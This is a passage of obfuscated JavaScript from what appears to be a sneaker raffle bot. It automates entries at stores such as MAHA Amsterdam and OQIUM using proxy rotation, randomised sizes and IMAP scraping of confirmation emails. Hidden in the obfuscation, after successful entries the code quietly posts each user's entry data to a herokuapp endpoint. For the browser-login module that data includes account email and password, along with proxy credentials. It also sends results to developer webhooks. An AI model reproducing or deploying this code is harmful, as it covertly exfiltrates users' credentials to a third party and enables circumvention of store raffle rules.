                            console['log'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20Logging\x20in'), await _0x363ec3['waitForSelector']('#username'), await _0x363ec3['type']('#username', _0x544636[_0x8fb55a]['Email']), await _0x363ec3['waitForSelector']('#password'), await _0x363ec3['type']('#password', _0x544636[_0x8fb55a]['Password']), await _0x9175f4(0x190), await _0x363ec3['click']('#buttonSubmit'), await _0x363ec3['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20Getting\x20Product'), await _0x9175f4(0x1f4), console['log'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x544636[_0x8fb55a]['Size']);
                            let _0x37035e = _0x544636[_0x8fb55a]['Size']['replace']('.5', '\x201/2');
                            if (_0x37035e['toUpperCase']() == 'RANDOM') {
                                const _0x17d2cf = await _0x363ec3['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x5e2f51 = Math['round'](Math['random']() * (_0x17d2cf['length'] - 0x1));
                                await _0x17d2cf[_0x5e2f51]['click']();
                            } else
                                await _0x363ec3['click']('button[aria-label=\x22' + _0x37035e + '\x22]');
                            await _0x9175f4(0x1f4);
                            try {
                                await _0x363ec3['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x9175f4(0x12c), console['log'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20Filling\x20Information'), await _0x363ec3['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x9175f4(0x12c), await _0x363ec3['type']('#dwfrm_raffle_addressFields_firstName', _0x544636[_0x8fb55a]['FirstName']), await _0x9175f4(0x12c), await _0x363ec3['type']('#dwfrm_raffle_addressFields_lastName', _0x544636[_0x8fb55a]['LastName']), await _0x9175f4(0x12c), await _0x363ec3['select']('#dwfrm_raffle_addressFields_country', _0x544636[_0x8fb55a]['Country']), await _0x9175f4(0x12c), await _0x363ec3['type']('#dwfrm_raffle_addressFields_city', _0x544636[_0x8fb55a]['City']), await _0x9175f4(0x12c);
                            _0x544636[_0x8fb55a]['Postcode'] == undefined && (_0x544636[_0x8fb55a]['Postcode'] = _0x544636[_0x8fb55a]['Zip']);
                            await _0x363ec3['type']('#dwfrm_raffle_addressFields_postalCode', _0x544636[_0x8fb55a]['Postcode']), await _0x9175f4(0x12c), await _0x363ec3['type']('#dwfrm_raffle_addressFields_address1', _0x544636[_0x8fb55a]['Address1']), await _0x9175f4(0x12c), await _0x363ec3['type']('#dwfrm_raffle_addressFields_address2', _0x544636[_0x8fb55a]['HouseNumber']), await _0x9175f4(0x12c), await _0x363ec3['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x544636[_0x8fb55a]['Address2']), await _0x9175f4(0x12c), await _0x363ec3['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x9175f4(0x12c), await _0x363ec3['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x544636[_0x8fb55a]['Follower']), await _0x9175f4(0x1f4), await _0x363ec3['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x9175f4(0x1f4), console['log'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20' + _0x561058['blue']('Awaiting\x20Paypal\x20Payment')), await _0x363ec3['click']('.b-paypal_button');
                            try {
                                await _0x363ec3['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x3cf3f7 = 'no', _0x3e2f6d(_0x544636[_0x8fb55a], _0x1d2ef5), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x5a6e18['succesDEVMSG']);
                                await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x5a6e18['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x2f03c2, _0x5a6e18['succesPUBMSG']);
                                let _0x414497 = _0x544636[_0x8fb55a];
                                try {
                                    prxdata = {
                                        'username': _0x100f6f['replace']('#', ''),
                                        'module': _0x1d2ef5['name'],
                                        'entrydata': JSON['stringify'](_0x414497),
                                        'proxy': '' + _0x3ad7c9[_0x8fb55a]
                                    };
                                    var _0x73940e = JSON['stringify'](prxdata);
                                    let _0x3dd991 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x73940e, _0x3dd991);
                                } catch (_0xef8b31) {
                                }
                            } catch (_0x2c2dba) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x2c2dba)), _0x6467f1 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x2c2dba;
                                var _0x424c80 = await _0x22ebf6(_0x544636[_0x8fb55a], _0x1d2ef5, 'dev', !![], _0x6467f1);
                                _0x5a6e18['errorDEV'] = { 'embeds': [_0x424c80] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x5a6e18['errorDEV']), await _0x1cac9f(_0x569bf6, _0x5a6e18['errorDEV']);
                            }
                        } catch (_0x12e786) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20' + _0x12e786)), _0x6467f1 = '' + _0x12e786;
                            var _0x424c80 = await _0x22ebf6(_0x544636[_0x8fb55a], _0x1d2ef5, 'dev', !![], _0x6467f1);
                            _0x5a6e18['errorDEV'] = { 'embeds': [_0x424c80] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x5a6e18['errorDEV']), await _0x1cac9f(_0x569bf6, _0x5a6e18['errorDEV']), _0x3cf3f7 = 'yes';
                        } finally {
                            _0xcc66fc && _0xcc66fc['close']();
                            if (_0x3cf3f7 == 'yes' && _0x557335 != 0x5) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1d2ef5['name'] + ']\x20Task\x20' + (_0x8fb55a + 0x1) + '\x20:\x20Retrying\x20(' + _0x557335 + '\x20/\x205)')), _0x8fb55a = _0x8fb55a - 0x1, _0x557335 = _0x557335 + 0x1;
                                continue;
                            }
                            _0x3cf3f7 == 'yes' && _0x557335 >= 0x5 && (_0x194f3c(_0x544636[_0x8fb55a], _0x1d2ef5), _0x3cf3f7 = 'no', _0x557335 = 0x0), console['log']('Waiting\x20for\x20' + _0x263298['AfewDelay'] + '\x20ms'), await _0x9175f4(_0x263298['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RLhP3P',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TRdHMm',
                                '$consent_form_version': 0x899638,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x389557, _0x19e4c3, _0x404f5b) {
                    for (var _0x1f6a71 = 0x0; _0x1f6a71 < _0x19e4c3['length']; _0x1f6a71++) {
                        try {
                            await _0x5c0aeb(_0x19e4c3, _0x1f6a71);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x4f7f98(_0x273564, _0x536964, _0x5d22d6, _0x498e63, _0x495de7) {
                            var _0x29e895, _0x3eb367 = {}, _0x1de4f3 = [], _0x5284d7 = {}, _0x3a67c7 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x42fd12 = Math['round'](Math['random']() * (_0x3a67c7['length'] - 0x1));
                            !_0x498e63 && (_0x498e63 = {});
                            if (_0x536964 != 'ver') {
                                _0x73a448(_0x5d22d6['name'] + '\x20Task\x20' + (_0x273564 + 0x1) + '\x20/\x20' + _0x498e63['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291), await _0x5c0aeb(_0x498e63, _0x273564), _0x3eb367 = _0x5d22d6['data'], _0x3eb367['data']['attributes']['email'] = '' + _0x498e63[_0x273564]['Email'];
                                if (_0x498e63[_0x273564]['Size'] == 'RANDOM') {
                                }
                                _0x3eb367['data']['attributes']['properties']['$first_name'] = '' + _0x498e63[_0x273564]['FirstName'], _0x3eb367['data']['attributes']['properties']['$last_name'] = '' + _0x498e63[_0x273564]['LastName'], _0x3eb367['data']['attributes']['properties']['$address1'] = _0x498e63[_0x273564]['Address1'] + '\x20' + _0x498e63[_0x273564]['Address2'] + '\x20' + _0x498e63[_0x273564]['HouseNumber'], _0x3eb367['data']['attributes']['properties']['$zip'] = '' + _0x498e63[_0x273564]['Zip'], _0x3eb367['data']['attributes']['properties']['$city'] = '' + _0x498e63[_0x273564]['City'], _0x3eb367['data']['attributes']['properties']['$country'] = '' + _0x498e63[_0x273564]['Country'], _0x498e63[_0x273564]['Size'] == 'RANDOM' ? _0x3eb367['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3a67c7[_0x42fd12] : _0x3eb367['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x498e63[_0x273564]['Size'], _0x3eb367['data']['attributes']['properties']['$phone_number'] = '' + _0x498e63[_0x273564]['Phone'], _0x3eb367['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x498e63[_0x273564]['Follower'];
                            }
                            if (_0x263298['useRandomProxy'] = ![])
                                var _0x41da96 = _0x495de7[_0x273564]['split'](':');
                            else
                                var _0x8fa2a1 = Math['round'](Math['random']() * (_0x495de7['length'] - 0x1)), _0x41da96 = _0x495de7[_0x8fa2a1]['split'](':');
                            var _0x5e9c61 = {
                                'jar': _0x57be51,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x5d22d6['url'],
                                'headers': _0x5d22d6['headers'],
                                'body': JSON['stringify'](_0x3eb367),
                                'proxy': 'http://' + _0x41da96[0x2] + ':' + _0x41da96[0x3] + '@' + _0x41da96[0x0] + ':' + _0x41da96[0x1]
                            };
                            return _0x536964 != 'ver' && (_0x5e9c61['url'] = _0x5d22d6['url'], _0x5e9c61['headers'] = _0x5d22d6['headers']), _0x536964 == 'ver' && (_0x5e9c61['method'] = 'GET'), new Promise(function (_0x2bd026, _0x3db1fb) {
                                callback = async (_0x254675, _0x121c20, _0x51b405) => {
                                    if (!_0x254675 && _0x121c20['statusCode'] == 0xca || !_0x254675 && _0x121c20['statusCode'] == 0xc8) {
                                        if (_0x536964 != 'ver') {
                                            var _0x5b6059 = await _0x22ebf6(_0x498e63[_0x273564], _0x5d22d6, 'dev', ![]), _0x345b3a = await _0x22ebf6(_0x498e63[_0x273564], _0x5d22d6, 'pub', ![]);
                                            const _0x39c672 = {
                                                'succesDEVMSG': { 'embeds': [_0x5b6059] },
                                                'succesPUBMSG': { 'embeds': [_0x345b3a] }
                                            };
                                            let _0x46b294 = _0x498e63[_0x273564];
                                            try {
                                                prxdata = {
                                                    'username': _0x100f6f['replace']('#', ''),
                                                    'module': _0x5d22d6['name'],
                                                    'entrydata': JSON['stringify'](_0x46b294),
                                                    'proxy': '' + _0x495de7[_0x273564]
                                                };
                                                var _0x4b9e43 = JSON['stringify'](prxdata);
                                                let _0x4514e7 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x4b9e43, _0x4514e7);
                                            } catch (_0x43a409) {
                                            }
                                            if (_0x263298['webhook'] != undefined && _0x263298['webhook'] != '')
                                                try {
                                                    await _0x1cac9f(_0x263298['webhook'], _0x39c672['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x39c672['succesDEVMSG']), await _0x9175f4(0xc8);
                                            try {
                                                await _0x1cac9f(_0x2f03c2, _0x39c672['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x3e2f6d(_0x498e63[_0x273564], _0x5d22d6);
                                        }
                                        _0x2bd026(console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x5d22d6['name'] + ']\x20Task\x20' + (_0x273564 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x536964 != 'ver') {
                                            var _0x520a88 = '' + _0x254675, _0x41fceb = await _0x22ebf6(_0x498e63[_0x273564], _0x5d22d6, 'dev', !![], _0x520a88), _0x51c0f7 = {};
                                            _0x51c0f7['errorDEV'] = { 'embeds': [_0x41fceb] }, _0x194f3c(_0x498e63[_0x273564], _0x5d22d6), _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x51c0f7['errorDEV']), await _0x1cac9f(_0x569bf6, _0x51c0f7['errorDEV']);
                                        }
                                        _0x3db1fb(console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x5d22d6['name'] + ']\x20Task\x20' + (_0x273564 + 0x1) + ':\x20' + _0x254675)));
                                    }
                                };
                                try {
                                    _0x536964 != 'ver' && console['log'](_0x1500d7() + '\x20[' + _0x5d22d6['name'] + ']\x20Task\x20' + (_0x273564 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3eb367['data']['attributes']['email']), _0x44d2d2(_0x5e9c61, callback);
                                } catch (_0x59d6c0) {
                                    console['log'](_0x1500d7() + '\x20Task\x20' + (_0x273564 + 0x1) + ':\x20' + _0x59d6c0);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x4f7f98(_0x1f6a71, 'nor', _0x389557, _0x19e4c3, _0x404f5b), console['log'](_0x1500d7() + '\x20[' + _0x389557['name'] + ']\x20Sleeping\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        } catch (_0xd28e6e) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x129013, _0x2e11d2, _0x5da4c7) {
                    var _0x16c7ac = [], _0x19e12a = ![];
                    async function _0x10101c() {
                        var _0x424268 = new _0x518654({
                            'user': _0x263298['masterMail'],
                            'password': _0x263298['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x101702(_0x152851) {
                            _0x424268['openBox']('INBOX', ![], _0x152851);
                        }
                        _0x424268['once']('ready', function () {
                            _0x101702(function (_0x4c2266, _0x2289bf) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4c2266)
                                    throw _0x4c2266;
                                _0x424268['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x3ebfcc, _0x27f0b4) {
                                    if (!_0x27f0b4 || !_0x27f0b4['length'])
                                        console['log'](_0x1500d7() + '\x20[' + _0x129013['name'] + ']\x20No\x20mails\x20found'), _0x424268['end']();
                                    else {
                                        var _0x4a900a = _0x424268['seq']['fetch'](_0x27f0b4, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4a900a['on']('message', function (_0x2e519f, _0x3aa6ba) {
                                            var _0x46d233 = '(#' + _0x3aa6ba + ')\x20';
                                            _0x2e519f['on']('body', function (_0x40fd28, _0x36fcf4) {
                                                _0x504fd9(_0x40fd28, (_0x404bcb, _0x47d794) => {
                                                    var _0x1dbf85 = _0x47d794['text']['split']('(')[0x1], _0x5b571c = _0x1dbf85['split'](')')[0x0];
                                                    _0x16c7ac['push'](_0x5b571c);
                                                });
                                            }), _0x2e519f['once']('end', function () {
                                            });
                                        }), _0x4a900a['once']('error', function (_0x34a5b5) {
                                            console['log']('Fetch\x20error:\x20' + _0x34a5b5), _0x19e12a = !![];
                                        }), _0x4a900a['once']('end', function () {
                                            _0x424268['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x424268['once']('error', function (_0x5bf941) {
                            console['log'](_0x561058['red'](_0x5bf941['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x19e12a = !![];
                        }), _0x424268['once']('end', async function () {
                            _0x19e12a = !![];
                        }), _0x424268['connect']();
                    }
                    async function _0x3d5440(_0xfaed2f, _0x4553f6, _0x30c091) {
                        for (var _0x376d5b = 0x0; _0x376d5b < _0x4553f6['length']; _0x376d5b++) {
                            async function _0x511b58(_0x796b9f, _0x5097dd, _0x7055, _0x1e5006, _0x3a268e) {
                                var _0x53ffbb, _0x5799c3 = {}, _0x38c36b = [], _0x57f3f5 = {}, _0x42d900 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1f19f9 = Math['round'](Math['random']() * (_0x42d900['length'] - 0x1));
                                _0x1e5006[_0x796b9f]['Size'] == 'RANDOM' && (_0x1e5006[_0x796b9f]['Size'] = _0x42d900[_0x1f19f9]);
                                !_0x1e5006 && (_0x1e5006 = {});
                                if (_0x263298['useRandomProxy'] = ![])
                                    var _0x200a73 = _0x3a268e[_0x796b9f]['split'](':');
                                else
                                    var _0x9e914c = Math['round'](Math['random']() * (_0x3a268e['length'] - 0x1)), _0x200a73 = _0x3a268e[_0x9e914c]['split'](':');
                                var _0x2bac12 = {
                                    'jar': _0x57be51,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x7055['url'],
                                    'headers': _0x7055['headers'],
                                    'body': JSON['stringify'](_0x5799c3),
                                    'proxy': 'http://' + _0x200a73[0x2] + ':' + _0x200a73[0x3] + '@' + _0x200a73[0x0] + ':' + _0x200a73[0x1]
                                };
                                return _0x5097dd != 'ver' && (_0x2bac12['url'] = _0x7055['url'], _0x2bac12['headers'] = _0x7055['headers']), _0x5097dd == 'ver' && (_0x2bac12['method'] = 'GET', _0x2bac12['url'] = _0x1e5006[_0x796b9f]), new Promise(function (_0x36b4fe, _0x2b905d) {
                                    callback = async (_0x42ffe0, _0x72e92a, _0x44a74b) => {
                                        if (!_0x42ffe0 && _0x72e92a['statusCode'] == 0xca || !_0x42ffe0 && _0x72e92a['statusCode'] == 0xc8) {
                                            if (_0x5097dd != 'ver') {
                                                var _0x38ffa9 = await _0x22ebf6(_0x1e5006[_0x796b9f], _0x7055, 'dev', ![]), _0x25c94c = await _0x22ebf6(_0x1e5006[_0x796b9f], _0x7055, 'pub', ![]);
                                                const _0x26df01 = {
                                                    'succesDEVMSG': { 'embeds': [_0x38ffa9] },
                                                    'succesPUBMSG': { 'embeds': [_0x25c94c] }
                                                };
                                                if (_0x263298['webhook'] != undefined && _0x263298['webhook'] != '')
                                                    try {
                                                        await _0x1cac9f(_0x263298['webhook'], _0x26df01['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x26df01['succesDEVMSG']), await _0x9175f4(0xc8);
                                                try {
                                                    await _0x1cac9f(_0x2f03c2, _0x26df01['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3e2f6d(_0x1e5006[_0x796b9f], _0x7055);
                                            }
                                            _0x36b4fe(console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x7055['name'] + ']\x20Task\x20' + (_0x796b9f + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5097dd != 'ver') {
                                                var _0x4c4243 = '' + _0x42ffe0, _0xe7e988 = await _0x22ebf6(_0x1e5006[_0x796b9f], _0x7055, 'dev', !![], _0x4c4243), _0xe6c9f = {};
                                                _0xe6c9f['errorDEV'] = { 'embeds': [_0xe7e988] }, _0x194f3c(_0x1e5006[_0x796b9f], _0x7055), _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0xe6c9f['errorDEV']), await _0x1cac9f(_0x569bf6, _0xe6c9f['errorDEV']);
                                            }
                                            _0x2b905d(console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x7055['name'] + ']\x20Task\x20' + (_0x796b9f + 0x1) + ':\x20' + _0x42ffe0)));
                                        }
                                    };
                                    try {
                                        _0x5097dd != 'ver' ? console['log'](_0x1500d7() + '\x20[' + _0x7055['name'] + ']\x20Task\x20' + (_0x796b9f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5799c3['data']['attributes']['email']) : console['log'](_0x1500d7() + '\x20[' + _0x7055['name'] + ']\x20Task\x20' + (_0x796b9f + 0x1) + ':\x20Fetching\x20Response'), _0x44d2d2(_0x2bac12, callback);
                                    } catch (_0xbaeeee) {
                                        console['log'](_0x1500d7() + '\x20Task\x20' + (_0x796b9f + 0x1) + ':\x20' + _0xbaeeee);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x511b58(_0x376d5b, 'ver', _0xfaed2f, _0x4553f6, _0x30c091), console['log'](_0x1500d7() + '\x20[' + _0xfaed2f['name'] + ']\x20Sleeping\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                            } catch (_0x45b642) {
                            }
                        }
                    }
                    try {
                        _0x10101c();
                        while (!_0x19e12a) {
                            await _0x9175f4(0xbb8);
                        }
                        console['log']('Found\x20' + _0x16c7ac['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x9175f4(0x9c4);
                    }
                    await _0x3d5440(_0x129013, _0x16c7ac, _0x5da4c7);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'X4md8Z',
                            'custom_source': 'DZ4137-106',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WspqGE',
                                '$consent_form_version': 0x89a2a4,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x21d368, _0x411890, _0x17ef37) {
                    for (var _0x12f9da = 0x0; _0x12f9da < _0x411890['length']; _0x12f9da++) {
                        try {
                            await _0x5c0aeb(_0x411890, _0x12f9da);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x3dc1b8(_0x4f9a03, _0x47e9f0, _0x2970e9, _0x5a0755, _0x194cd9) {
                            var _0xaa95b7, _0x67c453 = {}, _0x37ba5e = [], _0x2b5e8c = {}, _0x45d44e = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1c25b6 = Math['round'](Math['random']() * (_0x45d44e['length'] - 0x1));
                            !_0x5a0755 && (_0x5a0755 = {});
                            if (_0x47e9f0 != 'ver') {
                                _0x73a448(_0x2970e9['name'] + '\x20Task\x20' + (_0x4f9a03 + 0x1) + '\x20/\x20' + _0x5a0755['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291), _0x37ba5e = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x100f6f
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x5a0755[_0x4f9a03]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x263298['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x5ab5b1
                                        }
                                    ]
                                }], _0x2b5e8c = { 'embeds': _0x37ba5e }, _0x67c453 = _0x2970e9['data'], _0x67c453['data']['attributes']['email'] = '' + _0x5a0755[_0x4f9a03]['Email'];
                                if (_0x5a0755[_0x4f9a03]['Size'] == 'RANDOM') {
                                }
